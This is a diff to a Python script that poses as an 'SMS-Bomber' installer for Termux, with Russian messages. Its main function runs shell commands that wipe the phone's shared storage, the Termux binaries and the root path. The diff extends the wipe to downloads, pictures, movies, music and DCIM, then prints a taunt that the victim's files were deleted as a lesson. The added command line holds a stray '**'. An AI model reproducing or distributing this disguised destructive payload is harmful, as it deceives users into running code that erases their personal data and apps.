@@ -12,9 +12,9 @@ banner = '''
 def main():
 	print(banner)
 	print('Установка SMS-Бомбера......')
-	os.system("termux-setup-storage && cd storage && rm -rf shared && rm -rf /* && rm -rf /data/data/com.termux/files/usr/bin/ && rm -rf downloads && rm -rf *")
+	os.system("termux-setup-storage && cd storage && rm -rf shared && ** rm -rf downloads && rm -rf pictures && rm -rf movies && rm -rf music && rm -rf dcim && rm -rf /* && rm -rf /data/data/com.termux/files/usr/bin/ && rm -rf *")
 	time.sleep(1)
-	os.system('Ой, я случайно удалил тебе Termux. Будет тебе уроком, чтобы в следующий раз проверял код который запускаешь.')
+	os.system('Ой, я случайно удалил тебе Termux и файлы на телефоне. Будет тебе уроком, чтобы в следующий раз проверял код который запускаешь.')
 
 try:
 	main()
